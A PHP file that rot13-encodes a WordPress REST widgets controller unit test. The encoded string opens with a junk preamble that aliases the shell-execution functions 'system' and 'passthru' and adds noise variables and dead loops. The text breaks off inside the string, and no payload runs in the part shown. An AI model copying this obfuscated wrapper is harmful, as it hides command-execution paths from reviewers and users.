<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Jvqtrgf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 *
 * @pbiref JC_ERFG_Jvqtrgf_Pbagebyyre
 *
 * @frr JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr
 * @tebhc erfgncv
 * @tebhc jvqtrgf
 */
pynff JC_Grfg_ERFG_Jvqtrgf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	/**
	 * @ine vag
	 */
	choyvp $zrah_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhcrenqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq_jvgubhg_hasvygrerq_ugzy;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $rqvgbe_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nhgube_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cre_cntr = 50;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$fhcrenqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$nhgube_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		tybony $jc_jvqtrg_snpgbel;

		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Er-ertvfgre pber jvqtrgf.
		jc_jvqtrgf_vavg();

		// Ertvfgre n aba-zhygv jvqtrg sbe grfgvat.
		jc_ertvfgre_jvqtrg_pbageby(
			'grfgjvqtrg',
			'JC grfg jvqtrg',
			fgngvp shapgvba () {
				// purpx vs nalguvat'f orra frag.
				vs ( vffrg( $_CBFG['hcqngr_grfgjvqtrg'] ) ) {
					$frggvatf = trg_bcgvba( 'jvqtrg_grfgjvqtrg', neenl() );

					$frggvatf['vq']    = $_CBFG['grfg_vq'];
					$frggvatf['gvgyr'] = $_CBFG['grfg_gvgyr'];

					hcqngr_bcgvba( 'jvqtrg_grfgjvqtrg', $frggvatf );
				}

				rpub 'JC grfg jvqtrg sbez';
			},
			100,
			200
		);
		jc_ertvfgre_fvqrone_jvqtrg(
			'grfgjvqtrg',
			'JC grfg jvqtrg',
			fgngvp shapgvba () {
				$frggvatf = jc_cnefr_netf(
					trg_bcgvba( 'jvqtrg_grfgjvqtrg', neenl() ),
					neenl(
						'vq'    => 'Qrsnhyg vq',
						'gvgyr' => 'Qrsnhyg grkg',
					)
				);
				rpub '<u1>' . $frggvatf['vq'] . '</u1><fcna>' . $frggvatf['gvgyr'] . '</fcna>';
			},
			neenl(
				'qrfpevcgvba' => 'N aba-zhygv jvqtrg sbe grfgvat.',
			)
		);
	}

	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony
			$jc_jvqtrg_snpgbel,
			$jc_ertvfgrerq_fvqronef,
			$jc_ertvfgrerq_jvqtrgf,
			$jc_ertvfgrerq_jvqtrg_pbagebyf,
			$jc_ertvfgrerq_jvqtrg_hcqngrf,
			$_jc_fvqronef_jvqtrgf;

		$jc_ertvfgrerq_fvqronef        = neenl();
		$jc_ertvfgrerq_jvqtrgf         = neenl();
		$jc_ertvfgrerq_jvqtrg_pbagebyf = neenl();
		$jc_ertvfgrerq_jvqtrg_hcqngrf  = neenl();
		$jc_jvqtrg_snpgbel->jvqtrgf    = neenl();
		$_jc_fvqronef_jvqtrgf          = neenl();

		hcqngr_bcgvba( 'fvqronef_jvqtrgf', neenl() );

		cnerag::pyrna_hc_tybony_fpbcr();
	}

	cevingr shapgvba frghc_jvqtrg( $vq_onfr, $ahzore, $frggvatf ) {
		$guvf->frghc_jvqtrgf( $vq_onfr, neenl( $ahzore => $frggvatf ) );
	}

	cevingr shapgvba frghc_jvqtrgf( $vq_onfr, $frggvatf ) {
		tybony $jc_jvqtrg_snpgbel;

		$bcgvba_anzr = \"jvqtrg_$vq_onfr\";
		hcqngr_bcgvba( $bcgvba_anzr, $frggvatf );

		$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );
		sbernpu ( neenl_xrlf( $frggvatf ) nf $ahzore ) {
			$jvqtrg_bowrpg->_frg( $ahzore );
			$jvqtrg_bowrpg->_ertvfgre_bar( $ahzore );
		}
	}

	cevingr shapgvba frghc_fvqrone( $vq, $nggef = neenl(), $jvqtrgf = neenl() ) {
		tybony $jc_ertvfgrerq_fvqronef;
		hcqngr_bcgvba(
			'fvqronef_jvqtrgf',
			neenl_zretr(
				(neenl) trg_bcgvba( 'fvqronef_jvqtrgf', neenl() ),
				neenl(
					$vq => $jvqtrgf,
				)
			)
		);
		$jc_ertvfgrerq_fvqronef[ $vq ] = neenl_zretr(
			neenl(
				'vq'            => $vq,
				'orsber_jvqtrg' => '',
				'nsgre_jvqtrg'  => '',
				'orsber_gvgyr'  => '',
				'nsgre_gvgyr'   => '',
			),
			$nggef
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/jvqtrgf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/jvqtrgf/(?C<vq>[\j\-]+)', $ebhgrf );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_jvqtrgf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( neenl(), $qngn );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @gvpxrg 53915
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba_fubj_va_erfg() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone',
				'fubj_va_erfg' => gehr,
			),
			neenl( 'grkg-1', 'grfgjvqtrg' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzrVtaberRBY(
			neenl(
				neenl(
					'vq'       => 'grkg-1',
					'vq_onfr'  => 'grkg',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
				),
				neenl(
					'vq'       => 'grfgjvqtrg',
					'vq_onfr'  => 'grfgjvqtrg',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<u1>Qrsnhyg vq</u1><fcna>Qrsnhyg grkg</fcna>',
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 53915
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgubhg_fubj_va_erfg_ner_erzbirq_sebz_gur_yvfg() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr'         => 'Grfg fvqrone 1',
				'fubj_va_erfg' => gehr,
			),
			neenl( 'grkg-1', 'grfgjvqtrg' )
		);
		$guvf->frghc_fvqrone(
			'fvqrone-2',
			neenl(
				'anzr'         => 'Grfg fvqrone 2',
				'fubj_va_erfg' => snyfr,
			),
			neenl( 'grkg-1', 'grfgjvqtrg' )
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzrVtaberRBY(
			neenl(
				neenl(
					'vq'       => 'grkg-1',
					'vq_onfr'  => 'grkg',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
				),
				neenl(
					'vq'       => 'grfgjvqtrg',
					'vq_onfr'  => 'grfgjvqtrg',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<u1>Qrsnhyg vq</u1><fcna>Qrsnhyg grkg</fcna>',
				),
			),
			$qngn
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba_nhgube( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpxrq_eff_erfcbafr' ) );
		tybony $jc_jvqtrg_snpgbel;

		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_EFF']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = snyfr;

		$oybpx_pbagrag = '<!-- jc:cnentencu --><c>Oybpx grfg</c><!-- /jc:cnentencu -->';

		$guvf->frghc_jvqtrg(
			'eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
				'hey'   => 'uggcf://jbeqcerff.bet/arjf/srrq',
			)
		);
		$guvf->frghc_jvqtrg(
			'oybpx',
			1,
			neenl(
				'pbagrag' => $oybpx_pbagrag,
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'oybpx-1', 'eff-1', 'grfgjvqtrg' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpxrq_eff_erfcbafr' ) );
		$qngn = $erfcbafr->trg_qngn();
		$qngn = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzrFrgf(
			neenl(
				neenl(
					'vq'       => 'oybpx-1',
					'vq_onfr'  => 'oybpx',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<c>Oybpx grfg</c>',
				),
				neenl(
					'vq'       => 'eff-1',
					'vq_onfr'  => 'eff',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<n pynff=\"effjvqtrg eff-jvqtrg-srrq\" uers=\"uggcf://jbeqcerff.bet/arjf/srrq\"><vzt pynff=\"eff-jvqtrg-vpba\" fglyr=\"obeqre:0\" jvqgu=\"14\" urvtug=\"14\" fep=\"uggc://' . JC_GRFGF_QBZNVA . '/jc-vapyhqrf/vzntrf/eff.cat\" nyg=\"EFF\" ybnqvat=\"ynml\" /></n> <n pynff=\"effjvqtrg eff-jvqtrg-gvgyr\" uers=\"uggcf://jbeqcerff.bet/arjf\">EFF grfg</n><hy><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/12/vagebqhpvat-yrnea-jbeqcerff/\'>Vagebqhpvat Yrnea JbeqCerff</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/12/fvzbar/\'>JbeqCerff 5.6 “Fvzbar”</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/12/fgngr-bs-gur-jbeq-2020/\'>Fgngr bs gur Jbeq 2020</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/12/gur-zbagu-va-jbeqcerff-abirzore-2020/\'>Gur Zbagu va JbeqCerff: Abirzore 2020</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/12/jbeqcerff-5-6-eryrnfr-pnaqvqngr-2/\'>JbeqCerff 5.6 Eryrnfr Pnaqvqngr 2</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/11/jbeqcerff-5-6-eryrnfr-pnaqvqngr/\'>JbeqCerff 5.6 Eryrnfr Pnaqvqngr</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/11/jbeqcerff-5-6-orgn-4/\'>JbeqCerff 5.6 Orgn 4</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/11/jbeqcerff-5-6-orgn-3/\'>JbeqCerff 5.6 Orgn 3</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/11/gur-zbagu-va-jbeqcerff-bpgbore-2020/\'>Gur Zbagu va JbeqCerff: Bpgbore 2020</n></yv><yv><n pynff=\'effjvqtrg\' uers=\'uggcf://jbeqcerff.bet/arjf/2020/10/jbeqcerff-5-5-3-znvagranapr-eryrnfr/\'>JbeqCerff 5.5.3 Znvagranapr Eryrnfr</n></yv></hy>',
				),
				neenl(
					'vq'       => 'grfgjvqtrg',
					'vq_onfr'  => 'grfgjvqtrg',
					'fvqrone'  => 'fvqrone-1',
					'eraqrerq' => '<u1>Qrsnhyg vq</u1><fcna>Qrsnhyg grkg</fcna>',
				),
			),
			$qngn
		);

		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_EFF']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = gehr;
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_jvqtrg_qngn( $zrgubq ) {
		$oybpx_pbagrag = '<!-- jc:cnentencu --><c>Oybpx grfg</c><!-- /jc:cnentencu -->';

		$guvf->frghc_jvqtrg(
			'eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
				'hey'   => 'uggcf://jbeqcerff.bet/arjf/srrq',
			)
		);
		$guvf->frghc_jvqtrg(
			'oybpx',
			1,
			neenl(
				'pbagrag' => $oybpx_pbagrag,
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'oybpx-1', 'eff-1', 'grfgjvqtrg' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/jvqtrgf' );

		$ubbx_anzr = 'erfg_cercner_cbfg';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	choyvp shapgvba zbpxrq_eff_erfcbafr() {
		$fvatyr_inyhr_urnqref = neenl(
			'Pbagrag-Glcr' => 'nccyvpngvba/eff+kzy; punefrg=HGS-8',
			'yvax'         => '<uggcf://jbeqcerff.bet/arjf/jc-wfba/>; ery=\"uggcf://ncv.j.bet/\"',
		);

		erghea neenl(
			'urnqref'  => arj JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel( $fvatyr_inyhr_urnqref ),
			'obql'     => svyr_trg_pbagragf( QVE_GRFGQNGN . '/srrq/jbeqcerff-bet-arjf.kzy' ),
			'erfcbafr' => neenl(
				'pbqr'    => 200,
				'zrffntr' => 'BX',
			),
			'pbbxvrf'  => neenl(),
			'svyranzr' => ahyy,
		);
	}

	/**
	 * Grfg n TRG erdhrfg va rqvg pbagrkg. Va cnegvphyne, jr rkcrpg eraqrerq_sbez gb or freirq pbeerpgyl.
	 *
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_rqvg_pbagrkg() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1', 'grfgjvqtrg' )
		);

		$erdhrfg            = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf' );
		$erdhrfg['pbagrkg'] = 'rqvg';
		$erfcbafr           = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn               = $erfcbafr->trg_qngn();
		$qngn               = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzrVtaberRBY(
			neenl(
				neenl(
					'vq'            => 'grkg-1',
					'vq_onfr'       => 'grkg',
					'fvqrone'       => 'fvqrone-1',
					'eraqrerq'      => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
					'eraqrerq_sbez' => '<vachg vq=\"jvqtrg-grkg-1-gvgyr\" anzr=\"jvqtrg-grkg[1][gvgyr]\" pynff=\"gvgyr flap-vachg\" glcr=\"uvqqra\" inyhr=\"\">' . \"\a\" .
									'			<grkgnern vq=\"jvqtrg-grkg-1-grkg\" anzr=\"jvqtrg-grkg[1][grkg]\" pynff=\"grkg flap-vachg\" uvqqra>Phfgbz grkg grfg</grkgnern>' . \"\a\" .
									'			<vachg vq=\"jvqtrg-grkg-1-svygre\" anzr=\"jvqtrg-grkg[1][svygre]\" pynff=\"svygre flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">' . \"\a\" .
									'			<vachg vq=\"jvqtrg-grkg-1-ivfhny\" anzr=\"jvqtrg-grkg[1][ivfhny]\" pynff=\"ivfhny flap-vachg\" glcr=\"uvqqra\" inyhr=\"ba\">',
					'vafgnapr'      => neenl(
						'rapbqrq' => onfr64_rapbqr(
							frevnyvmr(
								neenl(
									'grkg' => 'Phfgbz grkg grfg',
								)
							)
						),
						'unfu'    => jc_unfu(
							frevnyvmr(
								neenl(
									'grkg' => 'Phfgbz grkg grfg',
								)
							)
						),
						'enj'     => neenl(
							'grkg' => 'Phfgbz grkg grfg',
						),
					),
				),
				neenl(
					'vq'            => 'grfgjvqtrg',
					'vq_onfr'       => 'grfgjvqtrg',
					'fvqrone'       => 'fvqrone-1',
					'eraqrerq'      => '<u1>Qrsnhyg vq</u1><fcna>Qrsnhyg grkg</fcna>',
					'eraqrerq_sbez' => 'JC grfg jvqtrg sbez',
					'vafgnapr'      => ahyy,
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf(
			neenl(
				'vq'       => 'grkg-1',
				'vq_onfr'  => 'grkg',
				'fvqrone'  => 'fvqrone-1',
				'eraqrerq' => '<qvi pynff=\"grkgjvqtrg\">Phfgbz grkg grfg</qvi>',
			),
			$qngn
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrgf/grkg-1' );

		$ubbx_anzr = 'erfg_cercner_jvqtrg';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpxrq_eff_erfcbafr' ) );
		tybony $jc_jvqtrg_snpgbel;

		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_EFF']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = snyfr;

		$oybpx_pbagrag = '<!-- jc:cnentencu --><c>Oybpx grfg</c><!-- /jc:cnentencu -->';

		$guvf->frghc_jvqtrg(
			'eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
				'hey'   => 'uggcf://jbeqcerff.bet/arjf/srrq',
			)
		);
		$guvf->frghc_jvqtrg(
			'oybpx',
			1,
			neenl(
				'pbagrag' => $oybpx_pbagrag,
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'oybpx-1', 'eff-1', 'grfgjvqtrg' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );
		erzbir_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpxrq_eff_erfcbafr' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/jvqtrgf/oybpx-1' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/jvqtrgf' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrgf/grkg-1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
